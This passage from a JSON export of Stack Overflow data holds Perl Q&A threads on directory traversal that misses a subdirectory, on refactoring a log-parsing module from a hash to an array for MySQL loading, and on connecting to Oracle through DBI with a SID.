"profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1532970866, "post_id": 51584473, "comment_id": 90164215, "body": "Use <code>opendir</code> and <code>readdir</code> to read the directory and see what error you get."}, {"owner": {"reputation": 11, "user_id": 1943866, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18b01ff2ce4c29049d50523ee176587?s=128&d=identicon&r=PG", "display_name": "Kris", "link": "https://stackoverflow.com/users/1943866/kris"}, "edited": false, "score": 0, "creation_date": 1533023354, "post_id": 51584473, "comment_id": 90181150, "body": "Borodin: Thank you for the input. I am currently create a local snippet of code for replicating the issue. I will use your incorporate you suggestion in my code and come back with the code. JDNI: Thank you. I will modify accordingly. ikegami : Thank you. Yes, i am doing the same . currently trying to debug why readir doesn&#39;t read this."}], "owner": {"reputation": 11, "user_id": 1943866, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18b01ff2ce4c29049d50523ee176587?s=128&d=identicon&r=PG", "display_name": "Kris", "link": "https://stackoverflow.com/users/1943866/kris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 120, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1532903062, "creation_date": 1532897623, "last_edit_date": 1532897970, "question_id": 51584473, "link": "https://stackoverflow.com/questions/51584473/readdir-filefindrule-is-not-reading-a-subdirectory-and-its-contents-in-perl", "title": "readdir/File::Find::Rule is not reading a subdirectory and its contents in perl", "body": "<p>I have tried 3 different ways to read contents of a folder and none of them are able to identify a subdirectory in a setup.</p>\n\n<p>Strange part is, when i recreate the folder structure locally , the sub-directory is identified and i get the file i am looking for with all the 3 solutions. </p>\n\n<p>This sub directory is created on the fly along with other files in the folder in the setup. Every time i am able to read all the files which are created but not the sub directory and its contents.</p>\n\n<p>I tried below solutions.</p>\n\n<p>Solution 1: </p>\n\n<pre><code>use File::Find::Rule;\n\nmy $dir = '.';\nmy @subdirs = File::Find::Rule-&gt;directory-&gt;in($dir);\nforeach (@subdirs) {\n  print \"Dir --&gt; $_ \\n\";\n}\n\nmy @list = (\"*.txt\", \"*.rex\");\nmy @files = File::Find::Rule-&gt;file()-&gt;name(@list)-&gt;in(@subdirs);\n\nforeach (@files) {\n  print \"File --&gt; $_ \\n\";\n}\n</code></pre>\n\n<p>--> It does not list the sub directory. The sub-directory contains the file i am looking for. So i am not getting the files.</p>\n\n<p>Variant of solution 1, which directly looks in the folder.</p>\n\n<pre><code>my $dir = getcwd();\nmy @types = (\"*.txt\",\"*.rex\");\nmy @files = File::Find::Rule-&gt;file()-&gt;name(@types)-&gt;in(\"$dir\");\n\nprint join(\"\\n\", @files);\n</code></pre>\n\n<p>This also does not print the files, as i see it does not check the sub directory which has the files.</p>\n\n<p>Solution 2: </p>\n\n<pre><code>my $cwd = getcwd();\n\nsub find_rex {\n    my $f = $File::Find::name;\n\n    if ($f =~ /rex$/){\n     print \"$f \\n\";\n    }\n}\n\nfind (\\&amp;find_rex, $cwd);\n</code></pre>\n\n<p>Solution 3:</p>\n\n<pre><code>my @dirlist = '.'; # current dir, or command line arguments\nforeach (@dirlist) { &amp;check_dir($_); }\nexit 0;\n\nsub check_dir {\n  my $dir=shift;\n  print \"Dir to search --&gt; $dir \\n\";\n\n  warn \"cannot traverse directory $dir\\n\"\n    unless (opendir D,$dir);\n  my @files = map {$dir.'/'.$_} grep {!m/^\\.{1,2}$/} readdir D;\n  closedir D;\n\n\n  foreach (@files) {\n    if (-d $_) { \n                 &amp;check_dir($_);\n    }\n    elsif (-f $_) { \n                   if ($_ =~ /\\.rex$/ ){\n                     print \"Filename --&gt; $_ \\n\";\n                  }\n    }\n}\n</code></pre>\n\n<p>}</p>\n\n<p>All these solutions worked locally for me to get the contents of the sub directory. I ensured the sub-directory had the same permissions locally also to test my code.The solutions work locally but it does not work in the actual setup.</p>\n\n<p>I have run out of ideas. I am able to see the sub folder and the files in it i need when i list them in linux. I have tried the glob as well, but it also does not work.</p>\n\n<p>More details: OS: Suse Linux , Bash/TCSH shell</p>\n\n<p>Can anyone suggest something that i can try. I am not sure whether its a readdir problem or something else. </p>\n\n<p>Has anyone faced this type of strange problem. What could i be doing wrong?\nPlease do suggest what i can do?</p>\n\n<p>The sub folder which does not get recognized is something like this \n2018-07-29T22.57.52</p>\n\n<p>This folder contains the files i am looking for and Perl Modules Find and readdir does not seems to be checking this.</p>\n\n<p>Please do let me know if i need to rephrase my question.</p>\n"}, {"tags": ["arrays", "perl", "maps"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1532870007, "post_id": 51580447, "comment_id": 90126635, "body": "If you are asking for a code review, those questions are better posted on <a href=\"https://codereview.stackexchange.com/\">codereview.stackexchange.com</a>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1532870775, "post_id": 51580447, "comment_id": 90126863, "body": "For a start you can remove the templates <code>($$$$$$$)</code> etc. from your subroutines. They don&#39;t do what you think they do and can be problematic, and they don&#39;t have any effect on methods anyway."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1532870867, "post_id": 51580447, "comment_id": 90126889, "body": "What database are you using? MySQL?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1532871255, "post_id": 51580447, "comment_id": 90126988, "body": "Have you <i>profiled</i> the code to see where the bottlenecks are? There&#39;s no point in just blindly changing things: you may be altering a section of code that is already fast, or you may actually slow things down. Take a look at <a href=\"https://metacpan.org/release/Devel-NYTProf\" rel=\"nofollow noreferrer\"><code>Devel::NYTProf</code></a>."}], "answers": [{"comments": [{"owner": {"reputation": 129, "user_id": 3414559, "user_type": "registered", "accept_rate": 12, "profile_image": "https://graph.facebook.com/1480602384/picture?type=large", "display_name": "Ray", "link": "https://stackoverflow.com/users/3414559/ray"}, "edited": false, "score": 0, "creation_date": 1532872169, "post_id": 51580804, "comment_id": 90127219, "body": "Nah, works fine in the original file. The issue is where i use array instead of map."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 129, "user_id": 3414559, "user_type": "registered", "accept_rate": 12, "profile_image": "https://graph.facebook.com/1480602384/picture?type=large", "display_name": "Ray", "link": "https://stackoverflow.com/users/3414559/ray"}, "edited": false, "score": 1, "creation_date": 1532872582, "post_id": 51580804, "comment_id": 90127335, "body": "The original file doesn&#39;t have a space at the end of the string."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 129, "user_id": 3414559, "user_type": "registered", "accept_rate": 12, "profile_image": "https://graph.facebook.com/1480602384/picture?type=large", "display_name": "Ray", "link": "https://stackoverflow.com/users/3414559/ray"}, "edited": false, "score": 2, "creation_date": 1532873421, "post_id": 51580804, "comment_id": 90127547, "body": "I can&#39;t fathom how your new code relates to the old version. You need to create an <i>MCVE</i>: read <a href=\"http://stackoverflow.com/help/mcve\"><i>How to create a Minimal, Complete, and Verifiable example</i></a> instead of just dumping two entire source files into the question. You should be publishing something that we can just copy and run ourselves to experience the same issue. And a &quot;map&quot; in Perl is a &quot;hash&quot;; <code>map</code> is a language word and using it any other way is confusing. In any case the new data"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 3, "last_activity_date": 1532872561, "last_edit_date": 1532872561, "creation_date": 1532871061, "answer_id": 51580804, "question_id": 51580447, "link": "https://stackoverflow.com/questions/51580447/converting-code-using-hash-to-array/51580804#51580804", "title": "Converting code using hash to array", "body": "<p>I would say that the problem is your </p>\n\n<pre><code>my $bcpFileUlsaAnalyserLogs = getBcpFilename( \"enm_ulsa_spectrum_analyser_logs \" )\n</code></pre>\n\n<p>I doubt if the file name really has a space at the end!</p>\n\n<p>I'm surprised that your <code>dbDo</code> or at least your</p>\n\n<pre><code>or die \"Failed to load new data ... \"\n</code></pre>\n\n<p>didn't catch this and report it. I don't like wrapping <code>DBI</code> code inside subroutines, especially when I can't see those subroutines.</p>\n\n<p>Note also that you should be using <em>placeholders</em></p>\n\n<pre><code>dbDo( $dbh, sprintf(\"DELETE FROM enm_ulsa_spectrum_analyser_logs  WHERE siteid = %d AND time BETWEEN '%s' AND '%s'\",\n$self-&gt;{'siteId'}, $self-&gt;{'r_instrDataEvent'}-&gt;{'ulsaStats'}-&gt;[0]-&gt;{'epochtime'},$self-&gt;{'r_instrDataEvent'}-&gt;{'ulsaStats'}-&gt;[$#{$self-&gt;{'r_instrDataEvent'}-&gt;{'ulsaStats'}}]-&gt;{'epochtime'}))\nor die \"Failed to delete from enm_ulsa_spectrum_analyser_logs\" . $dbh-&gt;errstr;#'\n</code></pre>\n\n<p>would be much better as</p>\n\n<pre><code>my $sth = $dbh-&gt;prepare(&lt;&lt;END_SQL);\nDELETE FROM enm_ulsa_spectrum_analyser_logs\nWHERE siteid = ? AND time BETWEEN ? AND ?\nEND_SQL\n\nmy $ulsa_stats = $self-&gt;{r_instrDataEvent}{ulsaStats};\n\n$sth-&gt;execute(\n    $self-&gt;{siteId},\n    $ulsa_stats-&gt;[0]{epochtime}, \n    $ulsa_stats-&gt;[-1]{epochtime}\n) or die \"Failed to delete from enm_ulsa_spectrum_analyser_logs: \" . $dbh-&gt;errstr;\n</code></pre>\n"}], "owner": {"reputation": 129, "user_id": 3414559, "user_type": "registered", "accept_rate": 12, "profile_image": "https://graph.facebook.com/1480602384/picture?type=large", "display_name": "Ray", "link": "https://stackoverflow.com/users/3414559/ray"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1532873767, "creation_date": 1532868249, "last_edit_date": 1532873767, "question_id": 51580447, "link": "https://stackoverflow.com/questions/51580447/converting-code-using-hash-to-array", "title": "Converting code using hash to array", "body": "<p>I am charged with making a Perl module more efficient. It takes log entries which are currently uniquely identified by date and server name and inserts them into our mysql database for later processing. </p>\n\n<p>I've posted the original file and my attempt below. My code doesn't insert into the database. I'm sure its a simple array handling problem but not sure.</p>\n\n<h3>Original file</h3>\n\n<pre><code>package UlsaSpectrumAnalyser;\n\nuse strict;\nuse warnings;\n\nuse Data::Dumper;\nuse EnmServiceGroup;\nuse StatsDB;\nuse DBI;\nuse StatsTime;\n\nsub new\n{\n    my $klass = shift;\n    my $self = bless {}, $klass;\n    return $self;\n}\n\nsub init($$$$)\n{\n    my ($self,$r_cliArgs,$r_incr,$dbh) = @_;\n    $self-&gt;{'site'} = $r_cliArgs-&gt;{'site'};\n    $self-&gt;{'siteId'} = $r_cliArgs-&gt;{'siteId'};\n    $self-&gt;{'date'} = $r_cliArgs-&gt;{'date'};\n    if ( exists $r_incr-&gt;{'UlsaSpectrumAnalyser'} )\n    {\n        $self-&gt;{'r_UlsaSpectrumAnalyser'} = $r_incr-&gt;{'UlsaSpectrumAnalyser'}-&gt;{'r_UlsaSpectrumAnalyser'};\n    }\n    else\n    {\n        $self-&gt;{'r_UlsaSpectrumAnalyser'} = {};\n    }\n\n    my @subscriptions = ();\n    $self-&gt;{'serverMap'} = {};\n    foreach my $service( \"pmservice\", \"saservice\" ) {\n        my $r_serverMap = enmGetServiceGroupInstances($self-&gt;{'site'}, $self-&gt;{'date'},$service);\n        while ( my ($server,$serverId) = each %{$r_serverMap} ) {\n            push ( @subscriptions, {'server' =&gt; $server, 'prog' =&gt; 'JBOSS'} );\n            $self-&gt;{'serverMap'}-&gt;{$server} = $serverId;\n        }\n    }\n    return \\@subscriptions;\n}\n\nsub handle($$$$$$$)\n{\n    my ($self,$timestamp,$host,$program,$severity,$message,$messageSize) = @_;\n    if ( $::DEBUG &gt; 9 ) { print \"UlsaSpectrumAnalyser::handle got message from $host $program : $message\\n\"; }\n\n    # Skip any warnings/errors\n    if ( $severity ne 'info' ) {\n        return;\n    }\n\n    my ($time)=$timestamp=~/(\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}).*/;\n    my ($epochtime) = getDateTimeInMilliSeconds($timestamp);\n    if ( $::DEBUG &gt; 3 ) { print \"UlsaSpectrumAnalyser::handle got message from $time $host $program : $message\\n\"; }\n\n    #Sample Log\n    #2017-09-08 14:55:36,028 INFO [com.X.Y.itpf.EVENT_LOGGER] (ajp-executor-threads - 18) [administrator, Spectrum Analyzer, DETAILED, #ULSA_COMPONENT_FFT, MeContext=lienb4003, Samples=65510; FileParsingTime(ms)=50; FastFourierTime(ms)=370; PostProcessingTime(ms)=3; #ChartScalingTime(ms)=1; TotalTime(ms)=424]\n\n    if( $message =~ /.*ULSA_COMPONENT_FFT,\\s+(\\S+),\\s+Samples=(\\d+);\\s+FileParsingTime\\S+=(\\d+);\\s+FastFourierTime\\S+=(\\d+);\\s+PostProcessingTime\\S+=(\\d+);\\s+ChartScalingTime\\S+=(\\d+);\\s+TotalTime\\S+=(\\d+)]/ ) {\n\n       my $activity = $epochtime . '@@' . $host;  #TODO Handle array instead of hash. Working on separately\n       my $serverid = $self-&gt;{'serverMap'}-&gt;{$host};\n       $self-&gt;{'r_UlsaSpectrumAnalyser'}-&gt;{$activity} = {\n               'time'                  =&gt; $time,\n               'epochtime'             =&gt; $epochtime,\n               'serverid'              =&gt; $serverid,\n               'source'                =&gt; $1,\n               'sample'                =&gt; $2,\n               'file_parsing_time'     =&gt; $3,\n               'fast_fourier_time'     =&gt; $4,\n               'post_processing_time'  =&gt; $5,\n               'chart_scaling_time'    =&gt; $6,\n               'total_time'            =&gt; $7};\n    }\n\n}\n\nsub handleExceeded($$$)\n{\n    my ($self, $host, $program) = @_;\n}\n\nsub done($$$)\n{\n    my ($self,$dbh,$r_incr) = @_;\n    my $tmpDir = '/data/tmp';\n    my $date=$self-&gt;{'date'};\n    if (exists $ENV{'TMP_DIR'})\n    {\n        $tmpDir = $ENV{'TMP_DIR'};\n    }\n    my $bcpFileUlsaAnalyserLogs = \"$tmpDir/ulsa_spectrum_analyser_logs.bcp\";\n    open (BCP, \"&gt; $bcpFileUlsaAnalyserLogs\") or die \"Failed to open $bcpFileUlsaAnalyserLogs\";\n\n    foreach my $activity (sort keys %{$self-&gt;{'r_UlsaSpectrumAnalyser'}}) {\n\n       print BCP $self-&gt;{'siteId'} . \"\\t\" .\n           $self-&gt;{'r_UlsaSpectrumAnalyser'}-&gt;{$activity}-&gt;{'serverid'} . \"\\t\" .\n           $self-&gt;{'r_UlsaSpectrumAnalyser'}-&gt;{$activity}-&gt;{'time'} . \"\\t\" .\n           $self-&gt;{'r_UlsaSpiUectrumAnalyser'}-&gt;{$activity}-&gt;{'epochtime'} . \"\\t\" .\n           $self-&gt;{'r_UlsaSpectrumAnalyser'}-&gt;{$activity}-&gt;{'source'} . \"\\t\" .\n           $self-&gt;{'r_UlsaSpectrumAnalyser'}-&gt;{$activity}-&gt;{'sample'} . \"\\t\" .\n           $self-&gt;{'r_UlsaSpectrumAnalyser'}-&gt;{$activity}-&gt;{'file_parsing_time'} . \"\\t\" .\n           $self-&gt;{'r_UlsaSpectrumAnalyser'}-&gt;{$activity}-&gt;{'fast_fourier_time'} . \"\\t\" .\n           $self-&gt;{'r_UlsaSpectrumAnalyser'}-&gt;{$activity}-&gt;{'post_processing_time'} . \"\\t\" .\n           $self-&gt;{'r_UlsaSpectrumAnalyser'}-&gt;{$activity}-&gt;{'chart_scaling_time'} . \"\\t\" .\n           $self-&gt;{'r_UlsaSpectrumAnalyser'}-&gt;{$activity}-&gt;{'total_time'} . \"\\n\";\n    }\n    close BCP;\n    dbDo( $dbh, \"DELETE FROM enm_ulsa_spectrum_analyser_logs  WHERE siteid = $self-&gt;{'siteId'} AND time BETWEEN '$date 00:00:00' AND '$date 23:59:59'\" )\n    or die \"Failed to delete from enm_ulsa_spectrum_analyser_logs\" . $dbh-&gt;errstr;\n\n    dbDo( $dbh, \"LOAD DATA INFILE '$bcpFileUlsaAnalyserLogs' INTO TABLE enm_ulsa_spectrum_analyser_logs\" )\n    or die \"Failed to load new data from '$bcpFileUlsaAnalyserLogs' file to 'enm_ulsa_spectrum_analyser_logs' table\" . $dbh-&gt;errstr;\n    unlink($bcpFileUlsaAnalyserLogs);\n\n    $r_incr-&gt;{'UlsaSpectrumAnalyser'} = {\n                                 'r_UlsaSpectrumAnalyser' =&gt; $self-&gt;{'r_UlsaSpectrumAnalyser'}\n                                 };\n}\n\n1;\n</code></pre>\n\n<h3>My attempt</h3>\n\n<pre><code>package UlsaSpectrumAnalyser;\n\nuse strict;\nuse warnings;\n\nuse Data::Dumper;\nuse StatsDB;\nuse DBI;\nuse StatsTime;\n\nsub new\n{\n    my $klass = shift;\n    my $self = bless {}, $klass;\n    return $self;\n}\n\nsub init($$$$)\n{\n    my ($self,$r_cliArgs,$r_incr,$dbh) = @_;\n    $self-&gt;{'site'} = $r_cliArgs-&gt;{'site'};\n    $self-&gt;{'siteId'} = $r_cliArgs-&gt;{'siteId'};\n    $self-&gt;{'date'} = $r_cliArgs-&gt;{'date'};\n    $self-&gt;{'r_instrDataEvent'}-&gt;{'ulsaStats'} = [];\n\n\n    my @subscriptions = ();\n    $self-&gt;{'serverMap'} = {};\n    foreach my $service( \"pmservice\", \"saservice\" ) {\n        my $r_serverMap = enmGetServiceGroupInstances($self-&gt;{'site'}, $self-&gt;{'date'},$service);\n        while ( my ($server,$serverId) = each %{$r_serverMap} ) {\n            push ( @subscriptions, {'server' =&gt; $server, 'prog' =&gt; 'JBOSS'} );\n            $self-&gt;{'serverMap'}-&gt;{$server} = $serverId;\n        }\n    }\n    return \\@subscriptions;\n}\n\nsub handle($$$$$$$)\n{\n    my ($self,$timestamp,$host,$program,$severity,$message,$messageSize) = @_;\n    if ( $::DEBUG &gt; 9 ) { print \"UlsaSpectrumAnalyser::handle got message from $host $program : $message\\n\"; }\n\n    # Skip any warnings/errors\n    if ( $severity ne 'info' ) {\n        return;\n    }\n\n    my ($time)=$timestamp=~/(\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}).*/;\n    my ($epochtime) = getDateTimeInMilliSeconds($timestamp);\n    if ( $::DEBUG &gt; 3 ) { print \"UlsaSpectrumAnalyser::handle got message from $time $host $program : $message\\n\"; }\n\n    #Sample Log\n    #2017-09-08 14:55:36,028 INFO [com.X.y.itpf.EVENT_LOGGER] (ajp-executor-threads - 18) [administrator, Spectrum Analyzer, DETAILED, #ULSA_COMPONENT_FFT, MeContext=lienb4003, Samples=65510; FileParsingTime(ms)=50; FastFourierTime(ms)=370; PostProcessingTime(ms)=3; #ChartScalingTime(ms)=1; TotalTime(ms)=424]\n\n    if( $message =~ /.*ULSA_COMPONENT_FFT,\\s+(\\S+),\\s+Samples=(\\d+);\\s+FileParsingTime\\S+=(\\d+);\\s+FastFourierTime\\S+=(\\d+);\\s+PostProcessingTime\\S+=(\\d+);\\s+ChartScalingTime\\S+=(\\d+);\\s+TotalTime\\S+=(\\d+)]/ ) {\n        my $serverid = $self-&gt;{'r_instrDataEvent'}-&gt;{'serverid'};\n        my %event = (\n            'time'                 =&gt; $time,\n            'epochtime'            =&gt; $epochtime,\n            'serverid'             =&gt; $serverid,\n            'source'               =&gt; $1,\n            'sample'               =&gt; $2,\n            'file_parsing_time'    =&gt; $3,\n            'fast_fourier_time'    =&gt; $4,\n            'post_processing_time' =&gt; $5,\n            'chart_scaling_time'   =&gt; $6,\n            'total_time'           =&gt; $7\n        );\n        push @{$self-&gt;{'r_instrDataEvent'}-&gt;{'ulsaStats'}}, \\%event;\n    }\n}\n\nsub handleExceeded($$$)\n{\n    my ($self, $host, $program) = @_;\n}\n\nsub done($$$)\n{\n    my ($self,$dbh,$r_incr) = @_;\n\n    my $bcpFileUlsaAnalyserLogs = getBcpFilename(\"enm_ulsa_spectrum_analyser_logs \");\n    open (BCP, \"&gt; $bcpFileUlsaAnalyserLogs\") or die \"Failed to open $bcpFileUlsaAnalyserLogs\";\n\n    foreach my $activity (@{$self-&gt;{'r_instrDataEvent'}-&gt;{'ulsaStats'}}) {\n\n       print BCP $self-&gt;{'siteId'} . \"\\t\" .\n           $activity-&gt;{'serverid'} . \"\\t\" .\n           $activity-&gt;{'time'} . \"\\t\" .\n           $activity-&gt;{'epochtime'} . \"\\t\" .\n           $activity-&gt;{'source'} . \"\\t\" .\n           $activity-&gt;{'sample'} . \"\\t\" .\n           $activity-&gt;{'file_parsing_time'} . \"\\t\" .\n           $activity-&gt;{'fast_fourier_time'} . \"\\t\" .\n           $activity-&gt;{'post_processing_time'} . \"\\t\" .\n           $activity-&gt;{'chart_scaling_time'} . \"\\t\" .\n           $activity-&gt;{'total_time'} . \"\\n\";\n    }\n    close BCP;\n\n    dbDo( $dbh, sprintf(\"DELETE FROM enm_ulsa_spectrum_analyser_logs  WHERE siteid = %d AND time BETWEEN '%s' AND '%s'\",\n    $self-&gt;{'siteId'}, $self-&gt;{'r_instrDataEvent'}-&gt;{'ulsaStats'}-&gt;[0]-&gt;{'epochtime'},$self-&gt;{'r_instrDataEvent'}-&gt;{'ulsaStats'}-&gt;[$#{$self-&gt;{'r_instrDataEvent'}-&gt;{'ulsaStats'}}]-&gt;{'epochtime'}))\n    or die \"Failed to delete from enm_ulsa_spectrum_analyser_logs\" . $dbh-&gt;errstr;#'\n\n    dbDo( $dbh, \"LOAD DATA INFILE '$bcpFileUlsaAnalyserLogs' INTO TABLE enm_ulsa_spectrum_analyser_logs\" )\n    or die \"Failed to load new data from '$bcpFileUlsaAnalyserLogs' file to 'enm_ulsa_spectrum_analyser_logs' table\" . $dbh-&gt;errstr;\n}\n\n1;\n</code></pre>\n"}, {"tags": ["oracle", "perl", "dbi", "dbext"], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 10148714, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Mf5tI_UPOJg/AAAAAAAAAAI/AAAAAAAAFVY/ykM3Q4CJc0o/photo.jpg?sz=128", "display_name": "Loopzen", "link": "https://stackoverflow.com/users/10148714/loopzen"}, "edited": false, "score": 0, "creation_date": 1532981014, "post_id": 51573243, "comment_id": 90169092, "body": "Many thanks for your answer. The solution is coming. Im want this to connect to database using VIM editor and dbext-plugin. Whitout perl DBI module i achived. Your answer help me to understand how the plugin works, but i can not make it work. <code>let g:dbext_default_profile_myDBIConnection = &#39;type=DBI:user=myUser:passwd=myPass:driver=Oracle:conn_parms&zwnj;&#8203;=host=myHost;port=my&zwnj;&#8203;Port;sid=mySid&#39;</code> Its something very specific and i cant solve it. Many thanks for your answer."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 11, "user_id": 10148714, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Mf5tI_UPOJg/AAAAAAAAAAI/AAAAAAAAFVY/ykM3Q4CJc0o/photo.jpg?sz=128", "display_name": "Loopzen", "link": "https://stackoverflow.com/users/10148714/loopzen"}, "edited": false, "score": 0, "creation_date": 1532982326, "post_id": 51573243, "comment_id": 90169695, "body": "@Loopzen: I&#39;m sorry, but I have no idea what &quot;dbext-plugin&quot; is. Do you have a link?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 11, "user_id": 10148714, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Mf5tI_UPOJg/AAAAAAAAAAI/AAAAAAAAFVY/ykM3Q4CJc0o/photo.jpg?sz=128", "display_name": "Loopzen", "link": "https://stackoverflow.com/users/10148714/loopzen"}, "edited": false, "score": 0, "creation_date": 1532982560, "post_id": 51573243, "comment_id": 90169808, "body": "@Loopzen: Ok. I found dbext here - <a href=\"https://github.com/vim-scripts/dbext.vim\" rel=\"nofollow noreferrer\">github.com/vim-scripts/dbext.vim</a>. I&#39;m not sure why you&#39;re using DBI here. It looks like dbext has native Oracle support. I think you only need to use DBI for database engines that don&#39;t have built-in support."}, {"owner": {"reputation": 11, "user_id": 10148714, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Mf5tI_UPOJg/AAAAAAAAAAI/AAAAAAAAFVY/ykM3Q4CJc0o/photo.jpg?sz=128", "display_name": "Loopzen", "link": "https://stackoverflow.com/users/10148714/loopzen"}, "edited": false, "score": 0, "creation_date": 1532984510, "post_id": 51573243, "comment_id": 90170484, "body": "the native support is limited. For example, natively it does autocommit. Really I could use other software like Oracle SQL Developer or TOAD and maybe it will be more easy and useful, but I am vim user and i would like work only with vim, but autocommit is very dangerous to me. I have read dbext documentation. Besides in internet i dont find the solution. The SID example doesnt work neither, besides i dont understand how it can connect this way it we dont indicate the host."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 11, "user_id": 10148714, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Mf5tI_UPOJg/AAAAAAAAAAI/AAAAAAAAFVY/ykM3Q4CJc0o/photo.jpg?sz=128", "display_name": "Loopzen", "link": "https://stackoverflow.com/users/10148714/loopzen"}, "edited": false, "score": 0, "creation_date": 1532985926, "post_id": 51573243, "comment_id": 90170974, "body": "Doesn&#39;t the SID specify the hostname (in case you haven&#39;t noticed, I know almost nothing about Oracle)."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 4, "last_activity_date": 1532982851, "last_edit_date": 1532982851, "creation_date": 1532795531, "answer_id": 51573243, "question_id": 51572661, "link": "https://stackoverflow.com/questions/51572661/how-can-i-include-the-sid-for-a-dbi-oracle-connection/51573243#51573243", "title": "How can I include the SID for a DBI Oracle connection?", "body": "<p>Did you try looking at the documentation for <a href=\"https://metacpan.org/pod/DBD::Oracle\" rel=\"nofollow noreferrer\">DBD::Oracle</a>? That's the database driver module that DBI uses when it's connecting to an Oracle database. The documentation for DBDs often has useful tips on how to connect to a specific type of database. In this case, the second example in the synopsis shows how to connect using a SID.</p>\n\n<pre><code>$dbh = DBI-&gt;connect(\"dbi:Oracle:host=$host;sid=$sid\", $user, $passwd);\n</code></pre>\n\n<p><strong>Update:</strong> Looking at the documentation for <a href=\"https://github.com/vim-scripts/dbext.vim/blob/master/doc/dbext.txt\" rel=\"nofollow noreferrer\">dbext</a>, I see an example of using a SID.</p>\n\n<pre><code>let g:dbext_default_profile_ORA_db2 = 'type=DBI:user=scott:passwd=tiger:driver=Oracle:conn_parms=SID_NAME'\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 10148714, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Mf5tI_UPOJg/AAAAAAAAAAI/AAAAAAAAFVY/ykM3Q4CJc0o/photo.jpg?sz=128", "display_name": "Loopzen", "link": "https://stackoverflow.com/users/10148714/loopzen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 390, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1532982851, "creation_date": 1532790896, "last_edit_date": 1532803452, "question_id": 51572661, "link": "https://stackoverflow.com/questions/51572661/how-can-i-include-the-sid-for-a-dbi-oracle-connection", "title": "How can I include the SID for a DBI Oracle connection?", "body": "<p>I dont cant connect to Oracle database with dbi perl module.</p>\n\n<p>If i use <strong>ORA</strong> type connection i can.</p>\n\n<p>\"ORA Profile 